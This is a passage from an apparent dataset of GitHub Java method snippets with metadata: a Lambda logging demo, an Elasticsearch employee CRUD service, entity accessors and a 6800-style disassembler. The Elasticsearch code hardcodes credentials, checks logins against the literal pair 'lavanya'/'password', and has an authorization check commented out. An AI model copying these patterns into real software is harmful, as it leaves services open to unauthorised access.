//\u8fd4\u56de\u4e00\u4e2a\u62fc\u63a5\u597d\u7684\u5b57\u7b26\u4e32            return  msg1+msg2+msg3;        });*/        /*            \u4f7f\u7528Lambda\u8868\u8fbe\u5f0f\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012,\u4ec5\u4ec5\u662f\u628a\u53c2\u6570\u4f20\u9012\u5230showLog\u65b9\u6cd5\u4e2d            \u53ea\u6709\u6ee1\u8db3\u6761\u4ef6,\u65e5\u5fd7\u7684\u7b49\u7ea7\u662f1\u7ea7                \u624d\u4f1a\u8c03\u7528\u63a5\u53e3MessageBuilder\u4e2d\u7684\u65b9\u6cd5builderMessage                \u624d\u4f1a\u8fdb\u884c\u5b57\u7b26\u4e32\u7684\u62fc\u63a5            \u5982\u679c\u6761\u4ef6\u4e0d\u6ee1\u8db3,\u65e5\u5fd7\u7684\u7b49\u7ea7\u4e0d\u662f1\u7ea7                \u90a3\u4e48MessageBuilder\u63a5\u53e3\u4e2d\u7684\u65b9\u6cd5builderMessage\u4e5f\u4e0d\u4f1a\u6267\u884c                \u6240\u4ee5\u62fc\u63a5\u5b57\u7b26\u4e32\u7684\u4ee3\u7801\u4e5f\u4e0d\u4f1a\u6267\u884c            \u6240\u4ee5\u4e0d\u4f1a\u5b58\u5728\u6027\u80fd\u7684\u6d6a\u8d39         */        showLog(1,()->{            System.out.println(\"\u4e0d\u6ee1\u8db3\u6761\u4ef6\u4e0d\u6267\u884c\");            //\u8fd4\u56de\u4e00\u4e2a\u62fc\u63a5\u597d\u7684\u5b57\u7b26\u4e32            return  msg1+msg2+msg3;        });    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/23.%E3%80%90%E5%87%BD%E6%95%B0%E5%BC%8F%E6%8E%A5%E5%8F%A3%E3%80%91-%E7%AC%94%E8%AE%B0/code/12_FunctionalInterface/src/com/itheima/demo02/Lambda/Demo02Lambda.java", "stars": "2", "class": {"name": "Demo02Lambda", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "configureElasticSearch", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "RestHighLevelClient", "snippet": "    public static RestHighLevelClient configureElasticSearch(){        if(client != null)  return client;        final CredentialsProvider credentialsProvider =new BasicCredentialsProvider();        credentialsProvider.setCredentials(AuthScope.ANY,new UsernamePasswordCredentials(\"username\", \"password\"));        RestClientBuilder builder = RestClient.builder(new HttpHost(\"localhost\", 9200, \"http\")).setHttpClientConfigCallback(httpClientBuilder -> httpClientBuilder.setDefaultCredentialsProvider(credentialsProvider));        client = new RestHighLevelClient(builder);        return client;    }", "url": "https://raw.githubusercontent.com/lavanya172/ElasticSearch-RestAPI-JAVA/master/src/main/java/Employee/Controller/ESService.java", "stars": "2", "class": {"name": "ESService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "CreateIndex", "params": ["String"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "CreateIndexResponse", "snippet": "    public CreateIndexResponse CreateIndex(String reqName) throws IOException {        //creating an index        CreateIndexRequest request = new CreateIndexRequest(reqName);        request.settings(Settings.builder()                .put(\"index.number_of_shards\", 1)                .put(\"index.number_of_replicas\", 2)        );        Map<String, Object> message = new HashMap<>();        message.put(\"type\", \"text\");        Map<String, Object> properties = new HashMap<>();        properties.put(\"empId\", message);        properties.put(\"name\", message);        Map<String, Object> mapping = new HashMap<>();        mapping.put(\"properties\", properties);        request.mapping(mapping);        CreateIndexResponse indexResponse = client.indices().create(request, RequestOptions.DEFAULT);        System.out.println(\"response id: \"+indexResponse.index());        return indexResponse;    }", "url": "https://raw.githubusercontent.com/lavanya172/ElasticSearch-RestAPI-JAVA/master/src/main/java/Employee/Controller/ESService.java", "stars": "2", "class": {"name": "ESService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "CreateEmployee", "params": ["Employee"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "ResponseEntity", "snippet": "    public ResponseEntity CreateEmployee( @RequestBody Employee emp) throws IOException {        configureElasticSearch();        String IndexName = \"employee\";        IndexRequest request = new IndexRequest(IndexName);        request.id(emp.getId());        Map<String, Object> fields = new HashMap<>();        fields.put(\"empId\", emp.getId());        fields.put(\"name\", emp.getName());        request.source(fields);        IndexResponse indexResponse = client.index(request, RequestOptions.DEFAULT);        System.out.println(\"response id: \"+indexResponse.getId());        return new ResponseEntity(indexResponse, HttpStatus.CREATED);    }", "url": "https://raw.githubusercontent.com/lavanya172/ElasticSearch-RestAPI-JAVA/master/src/main/java/Employee/Controller/ESService.java", "stars": "2", "class": {"name": "ESService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "UpdateEmployee", "params": ["String", "Employee"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "IndexResponse", "snippet": "    public IndexResponse UpdateEmployee( @PathVariable(\"id\") String Id , @RequestBody Employee emp) throws IOException {        configureElasticSearch();        String IndexName = \"employee\";        IndexRequest request = new IndexRequest(IndexName);        request.id(Id);        Map<String, Object> fields = new HashMap<>();        fields.put(\"empId\", Id);        fields.put(\"name\", emp.getName());        request.source(fields);        IndexResponse indexResponse = client.index(request, RequestOptions.DEFAULT);        System.out.println(\"response id: \"+indexResponse.getId());        return indexResponse;    }", "url": "https://raw.githubusercontent.com/lavanya172/ElasticSearch-RestAPI-JAVA/master/src/main/java/Employee/Controller/ESService.java", "stars": "2", "class": {"name": "ESService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "DeleteEmployee", "params": ["String"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void DeleteEmployee( @PathVariable(\"id\") String Id) throws IOException {        String IndexName = \"employee\";        DeleteRequest request = new DeleteRequest(IndexName,Id);        DeleteResponse deleteResponse = client.delete(request,RequestOptions.DEFAULT);    }", "url": "https://raw.githubusercontent.com/lavanya172/ElasticSearch-RestAPI-JAVA/master/src/main/java/Employee/Controller/ESService.java", "stars": "2", "class": {"name": "ESService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "DeleteAllEmployee", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void DeleteAllEmployee() throws IOException {        DeleteIndexRequest request = new DeleteIndexRequest(\"employee\");        AcknowledgedResponse deleteIndexResponse = client.indices().delete(request, RequestOptions.DEFAULT);        CreateIndex(\"employee\");    }", "url": "https://raw.githubusercontent.com/lavanya172/ElasticSearch-RestAPI-JAVA/master/src/main/java/Employee/Controller/ESService.java", "stars": "2", "class": {"name": "ESService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "SearchDocument", "params": ["String"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "SearchResponse", "snippet": "    public SearchResponse SearchDocument(String IndexName) throws IOException {        SearchRequest searchRequest = new SearchRequest(IndexName);        SearchSourceBuilder sourceBuilder = new SearchSourceBuilder();        sourceBuilder.query(QueryBuilders.matchAllQuery());        searchRequest.source(sourceBuilder);        SearchResponse searchResponse = client.search(searchRequest,RequestOptions.DEFAULT);        return searchResponse;    }", "url": "https://raw.githubusercontent.com/lavanya172/ElasticSearch-RestAPI-JAVA/master/src/main/java/Employee/Controller/ESService.java", "stars": "2", "class": {"name": "ESService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "GetEmployeeDetails", "params": ["String"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "Map<String,Object>", "snippet": "    public Map<String, Object> GetEmployeeDetails(@PathVariable(\"id\") String empId) throws IOException {        configureElasticSearch();        SearchRequest searchRequest = new SearchRequest(\"employee\");        SearchSourceBuilder sourceBuilder = new SearchSourceBuilder();        sourceBuilder.query(QueryBuilders.matchQuery(\"empId\", empId));        searchRequest.source(sourceBuilder);        SearchResponse searchResponse = client.search(searchRequest,RequestOptions.DEFAULT);        SearchHit[] hits = searchResponse.getHits().getHits();        if(hits.length >0)        return  searchResponse.getHits().getHits()[0].getSourceAsMap();        return null;    }", "url": "https://raw.githubusercontent.com/lavanya172/ElasticSearch-RestAPI-JAVA/master/src/main/java/Employee/Controller/ESService.java", "stars": "2", "class": {"name": "ESService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "GetAllEmployees", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "ResponseEntity", "snippet": "    public ResponseEntity GetAllEmployees() throws IOException {//        @RequestHeader(\"Authorization\") String Authorization//        if(!ValidateUser(Authorization)){//            return new ResponseEntity(\"Invalid User\", HttpStatus.UNAUTHORIZED);//        }        configureElasticSearch();        ESService ts = new ESService();        SearchResponse searchResponse = ts.SearchDocument(\"employee\");        SearchHit[] hits = searchResponse.getHits().getHits();        if(hits.length ==0)            return null;        Map<String, Object>[] map = new HashMap[hits.length];        for(int i=0; i<hits.length; i++){            map[i] = searchResponse.getHits().getHits()[i].getSourceAsMap();        }        return new ResponseEntity(map, HttpStatus.OK);    }", "url": "https://raw.githubusercontent.com/lavanya172/ElasticSearch-RestAPI-JAVA/master/src/main/java/Employee/Controller/ESService.java", "stars": "2", "class": {"name": "ESService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "ValidateUser", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "Boolean", "snippet": "    private Boolean ValidateUser(String authorization){        if (authorization != null && authorization.toLowerCase().startsWith(\"basic\")) {            // Authorization: Basic base64credentials            String base64Credentials = authorization.substring(\"Basic\".length()).trim();            byte[] credDecoded = Base64.getDecoder().decode(base64Credentials);            String credentials = new String(credDecoded, StandardCharsets.UTF_8);            // credentials = username:password            final String[] values = credentials.split(\":\", 2);            if(values[0].equals(\"lavanya\") && values[1].equals(\"password\") )                return true;        }        return false;    }", "url": "https://raw.githubusercontent.com/lavanya172/ElasticSearch-RestAPI-JAVA/master/src/main/java/Employee/Controller/ESService.java", "stars": "2", "class": {"name": "ESService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) throws IOException {        ESService ts = new ESService();        RestHighLevelClient client = configureElasticSearch();        //ts.CreateIndex(\"employee\");        Employee emp = new Employee(\"104\",\"TestEmployee\");        ts.CreateEmployee( emp );        //ts.DeleteDocument(\"employee\",\"101\");        //System.out.println(ts.GetEmployeeDetails(\"2001\").getHits().getHits().toString());       // ts.SearchDocument(\"employee\");        //System.out.println(\"Closing...\");        ts.DeleteAllEmployee();        client.close();    }", "url": "https://raw.githubusercontent.com/lavanya172/ElasticSearch-RestAPI-JAVA/master/src/main/java/Employee/Controller/ESService.java", "stars": "2", "class": {"name": "ESService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getDistributor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Distributor", "snippet": "\tpublic Distributor getDistributor() {\t\treturn distributor;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/ProductOrder.java", "stars": "1", "class": {"name": "ProductOrder", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setDistributor", "params": ["Distributor"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setDistributor(Distributor distributor) {\t\tthis.distributor = distributor;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/ProductOrder.java", "stars": "1", "class": {"name": "ProductOrder", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getOrderId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getOrderId() {\t\treturn orderId;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/ProductOrder.java", "stars": "1", "class": {"name": "ProductOrder", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setOrderId", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setOrderId(String orderId) {\t\tthis.orderId = orderId;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/ProductOrder.java", "stars": "1", "class": {"name": "ProductOrder", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getName() {\t\treturn name;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/ProductOrder.java", "stars": "1", "class": {"name": "ProductOrder", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setName", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setName(String name) {\t\tthis.name = name;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/ProductOrder.java", "stars": "1", "class": {"name": "ProductOrder", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getQuantityValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "\tpublic double getQuantityValue() {\t\treturn quantityValue;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/ProductOrder.java", "stars": "1", "class": {"name": "ProductOrder", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setQuantityValue", "params": ["double"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setQuantityValue(double quantityValue) {\t\tthis.quantityValue = quantityValue;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/ProductOrder.java", "stars": "1", "class": {"name": "ProductOrder", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getQuantityUnit", "params": [], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "\tpublic double getQuantityUnit() {\t\treturn quantityUnit;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/ProductOrder.java", "stars": "1", "class": {"name": "ProductOrder", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setQuantityUnit", "params": ["double"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setQuantityUnit(double quantityUnit) {\t\tthis.quantityUnit = quantityUnit;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/ProductOrder.java", "stars": "1", "class": {"name": "ProductOrder", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getDateOfOrder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "\tpublic Date getDateOfOrder() {\t\treturn dateOfOrder;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/ProductOrder.java", "stars": "1", "class": {"name": "ProductOrder", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setDateOfOrder", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setDateOfOrder(Date dateOfOrder) {\t\tthis.dateOfOrder = dateOfOrder;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/ProductOrder.java", "stars": "1", "class": {"name": "ProductOrder", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getDateOfDelivery", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "\tpublic Date getDateOfDelivery() {\t\treturn dateOfDelivery;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/ProductOrder.java", "stars": "1", "class": {"name": "ProductOrder", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setDateOfDelivery", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setDateOfDelivery(Date dateOfDelivery) {\t\tthis.dateOfDelivery = dateOfDelivery;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/ProductOrder.java", "stars": "1", "class": {"name": "ProductOrder", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getPrice_per_unit", "params": [], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "\tpublic double getPrice_per_unit() {\t\treturn price_per_unit;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/ProductOrder.java", "stars": "1", "class": {"name": "ProductOrder", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setPrice_per_unit", "params": ["double"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setPrice_per_unit(double price_per_unit) {\t\tthis.price_per_unit = price_per_unit;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/ProductOrder.java", "stars": "1", "class": {"name": "ProductOrder", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getTotalPrice", "params": [], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "\tpublic double getTotalPrice() {\t\treturn totalPrice;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/ProductOrder.java", "stars": "1", "class": {"name": "ProductOrder", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setTotalPrice", "params": ["double"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setTotalPrice(double totalPrice) {\t\tthis.totalPrice = totalPrice;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/ProductOrder.java", "stars": "1", "class": {"name": "ProductOrder", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getDeliveryStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getDeliveryStatus() {\t\treturn deliveryStatus;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/ProductOrder.java", "stars": "1", "class": {"name": "ProductOrder", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setDeliveryStatus", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setDeliveryStatus(String deliveryStatus) {\t\tthis.deliveryStatus = deliveryStatus;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/ProductOrder.java", "stars": "1", "class": {"name": "ProductOrder", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getWarehouseId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getWarehouseId() {\t\treturn warehouseId;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/ProductOrder.java", "stars": "1", "class": {"name": "ProductOrder", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setWarehouseId", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setWarehouseId(String warehouseId) {\t\tthis.warehouseId = warehouseId;\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/ProductOrder.java", "stars": "1", "class": {"name": "ProductOrder", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "toString", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String toString() {\t\treturn \"ProductOrder [orderId=\" + orderId + \", name=\" + name + \", quantityValue=\" + quantityValue\t\t\t\t+ \", quantityUnit=\" + quantityUnit + \", dateOfOrder=\" + dateOfOrder + \", dateOfDelivery=\"\t\t\t\t+ dateOfDelivery + \", price_per_unit=\" + price_per_unit + \", totalPrice=\" + totalPrice\t\t\t\t+ \", deliveryStatus=\" + deliveryStatus + \", warehouseId=\" + warehouseId + \", distributor=\" + distributor\t\t\t\t+ \"]\";\t}", "url": "https://raw.githubusercontent.com/vijaykumbam/DrinkanddelightFinalVersion/master/DrinkandDelightsprintOracle/src/main/java/com/capgemini/drinkanddelight/entity/ProductOrder.java", "stars": "1", "class": {"name": "ProductOrder", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getOperand1", "params": ["int"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "    private int getOperand1(int index) {        if (index >= data.length) {            return 0;        }        else {            return data[index];        }    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/assembler/Disassembler.java", "stars": "4", "class": {"name": "Disassembler", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getOperand2", "params": ["int"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "    private int getOperand2(int index) {        if (index + 1 >= data.length) {            return 0;        }        else {            return ((data[index] & 0xff) << 8) + (data[index + 1] & 0xff);        }    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/assembler/Disassembler.java", "stars": "4", "class": {"name": "Disassembler", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "disassemble", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void disassemble() {        Instruction inst;        int i = 0;        while (startAddress + i < endAddress) {            int a = startAddress + i;            switch ((int)(data[i] & 0xff)) {            case 0x01:                inst = new NOP(a);                break;            case 0x06:                inst = new TAP(a);                break;            case 0x07:                inst = new TPA(a);                break;            case 0x08:                inst = new INX(a);                break;            case 0x09:                inst = new DEX(a);                break;            case 0x0A:                inst = new CLV(a);                break;            case 0x0B:                inst = new SEV(a);                break;            case 0x0C:                inst = new CLC(a);                break;            case 0x0D:                inst = new SEC(a);                break;            case 0x0E:                inst = new CLI(a);                break;            case 0x0F:                inst = new SEI(a);                break;            case 0x10:                inst = new SBA(a);                break;            case 0x11:                inst = new CBA(a);                break;            case 0x16:                inst = new TAB(a);                break;            case 0x17:                inst = new TAB(a);                break;            case 0x19:                inst = new DAA(a);                break;            case 0x1B:                inst = new ABA(a);                break;            case 0x20:                inst = new BRA(a, getOperand1(i + 1));                break;            case 0x22:                inst = new BHI(a, getOperand1(i + 1));                break;            case 0x23:                inst = new BLS(a, getOperand1(i + 1));                break;            case 0x24:                inst = new BCC(a, getOperand1(i + 1));                break;            case 0x25:                inst = new BCS(a, getOperand1(i + 1));                break;            case 0x26:                inst = new BNE(a, getOperand1(i + 1));                break;            case 0x27:                inst = new BEQ(a, getOperand1(i + 1));                break;            case 0x28:                inst = new BVC(a, getOperand1(i + 1));                break;            case 0x29:                inst = new BVS(a, getOperand1(i + 1));                break;            case 0x2A:                inst = new BPL(a, getOperand1(i + 1));                break;            case 0x2B:                inst = new BMI(a, getOperand1(i + 1));                break;            case 0x2C:                inst = new BGE(a, getOperand1(i + 1));                break;            case 0x2D:                inst = new BLT(a, getOperand1(i + 1));                break;            case 0x2E:                inst = new BGT(a, getOperand1(i + 1));                break;            case 0x2F:                inst = new BLE(a, getOperand1(i + 1));                break;            case 0x30:                inst = new TSX(a);                break;            case 0x31:                inst = new INS(a);                break;            case 0x32:                inst = new PULA(a);                break;            case 0x33:                inst = new PULB(a);                break;            case 0x34:                inst = new DES(a);                break;            case 0x35:                inst = new TXS(a);                break;            case 0x36:                inst = new PSHA(a);                break;            case 0x37:                inst = new PSHB(a);                break;            case 0x39:                inst = new RTS(a);                break;            case 0x3B:                inst = new RTI(a);                break;            case 0x3E:                inst = new WAI(a);                break;            case 0x3F:                inst = new SWI(a);                break;            case 0x40:                inst = new NEGA(a);                break;            case 0x43:                inst = new COMA(a);                break;            case 0x44:                inst = new LSRA(a);                break;            case 0x46:                inst = new RORA(a);                break;            case 0x47:                inst = new ASRA(a);                break;            case 0x48:                inst = new ASLA(a);                break;            case 0x49:                inst = new ROLA(a);                break;            case 0x4A:                inst = new DECA(a);                break;            case 0x4C:                inst = new INCA(a);                break;            case 0x4D:                inst = new TSTA(a);                break;            case 0x4F:                inst = new CLRA(a);                break;            case 0x50:                inst = new NEGB(a);                break;            case 0x53:                inst = new COMB(a);                break;            case 0x54:                inst = new LSRB(a);                break;            case 0x56:                inst = new RORB(a);                break;            case 0x57:                inst = new ASRB(a);                break;            case 0x58:                inst = new ASLB(a);                break;            case 0x59:                inst = new ROLB(a);                break;            case 0x5A:                inst = new DECB(a);                break;            case 0x5C:                inst = new INCB(a);                break;            case 0x5D:                inst = new TSTB(a);                break;            case 0x5F:                inst = new CLRB(a);                break;            case 0x60:                inst = new NEG(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0x63:                inst = new COM(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0x64:                inst = new LSR(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0x66:                inst = new ROR(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0x67:                inst = new ASR(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0x68:                inst = new ASL(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0x69:                inst = new ROL(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0x6A:                inst = new DEC(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0x6C:                inst = new INC(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0x6D:                inst = new TST(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0x6E:                inst = new JMP(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0x6F:                inst = new CLR(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0x70:                inst = new NEG(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0x71:                inst = new NIM(a, getOperand2(i + 1));                break;            case 0x72:                inst = new OIM(a, getOperand2(i + 1));                break;            case 0x73:                inst = new COM(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0x74:                inst = new LSR(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0x75:                inst = new XIM(a, getOperand2(i + 1));                break;            case 0x76:                inst = new ROR(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0x77:                inst = new ASR(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0x78:                inst = new ASL(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0x79:                inst = new ROL(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0x7A:                inst = new DEC(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0x7B:                inst = new TMM(a, getOperand2(i + 1));                break;            case 0x7C:                inst = new INC(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0x7D:                inst = new TST(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0x7E:                inst = new JMP(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0x7F:                inst = new CLR(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0x80:                inst = new SUBA(a, Instruction.MODE_IMMEDIATE, getOperand1(i + 1));                break;            case 0x81:                inst = new CMPA(a, Instruction.MODE_IMMEDIATE, getOperand1(i + 1));                break;            case 0x82:                inst = new SBCA(a, Instruction.MODE_IMMEDIATE, getOperand1(i + 1));                break;            case 0x84:                inst = new ANDA(a, Instruction.MODE_IMMEDIATE, getOperand1(i + 1));                break;            case 0x85:                inst = new BITA(a, Instruction.MODE_IMMEDIATE, getOperand1(i + 1));                break;            case 0x86:                inst = new LDAA(a, Instruction.MODE_IMMEDIATE, getOperand1(i + 1));                break;            case 0x88:                inst = new EORA(a, Instruction.MODE_IMMEDIATE, getOperand1(i + 1));                break;            case 0x89:                inst = new ADCA(a, Instruction.MODE_IMMEDIATE, getOperand1(i + 1));                break;            case 0x8A:                inst = new ORAA(a, Instruction.MODE_IMMEDIATE, getOperand1(i + 1));                break;            case 0x8B:                inst = new ADDA(a, Instruction.MODE_IMMEDIATE, getOperand1(i 